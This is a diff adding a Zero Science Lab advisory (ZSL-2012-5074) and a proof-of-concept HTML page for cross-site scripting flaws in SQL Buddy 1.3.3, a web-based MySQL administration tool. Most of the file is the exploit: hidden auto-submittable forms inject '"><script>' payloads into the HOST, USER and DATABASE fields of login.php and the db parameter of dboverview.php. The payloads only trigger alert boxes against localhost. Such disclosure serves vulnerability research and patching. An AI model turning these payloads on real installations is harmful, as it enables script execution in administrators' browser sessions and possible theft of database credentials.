@@ -1,0 +1,63 @@
+<!--
+
+SQL Buddy 1.3.3 (GET/POST) Multiple Remote Cross-Site Scripting Vulnerabilities
+
+
+Vendor: Calvin Lough
+Product web page: http://www.sqlbuddy.com
+Affected version: 1.3.3
+
+Summary: SQL Buddy is an open source web based MySQL administration application.
+
+Desc: SQL Buddy suffers from a XSS vulnerability when parsing user input to the
+'DATABASE', 'HOST' and 'USER' parameters via POST method in 'login.php', and the
+'db' parameter in 'dboverview.php' via GET method. Attackers can exploit these
+weaknesses to execute arbitrary HTML and script code in a user's browser session.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.21
+           PHP 5.3.9
+           MySQL 5.5.20
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2012-5074
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5074.php
+
+CWE-79: http://cwe.mitre.org/data/definitions/79.html
+
+
+13.02.2012
+
+-->
+
+
+
+<html>
+<title>SQL Buddy 1.3.3 (GET/POST) Multiple Remote Cross-Site Scripting Vulnerabilities</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">
+function xss(){document.forms["xss"].submit();}
+function xss2(){document.forms["xss2"].submit();}
+</script>
+<br /><br />
+<form action="http://localhost/sqlbuddy/login.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="HOST" value='"><script>alert(1)</script>' />
+<input type="hidden" name="USER" value='"><script>alert(2)</script>' />
+<input type="hidden" name="DATABASE" value='"><script>alert(3)</script>' />
+</form>
+<!-- [post-auth (get)] -->
+<form action="http://localhost/sqlbuddy/dboverview.php" method="GET" id="xss2">
+<input type="hidden" name="db" value='1"><script>alert(1)</script>' />
+</form>
+<a href="javascript: xss();" style="text-decoration:none">
+<b><font color="red"><center><h3>POST Method Exploit!</h3></font></b></a><br /><br />
+<a href="javascript: xss2();" style="text-decoration:none">
+<b><font color="red"><h3>GET Method Exploit!</h3></font></b></a><br /><br />
+<br /><br /><br /><br /><font color="gray">&copy; 2012.</font>
+<a href="http://www.zeroscience.mk" target="_blank" style="text-decoration:none">
+<font color="gray">Zero Science Lab</a></font></center>
+</body></html>
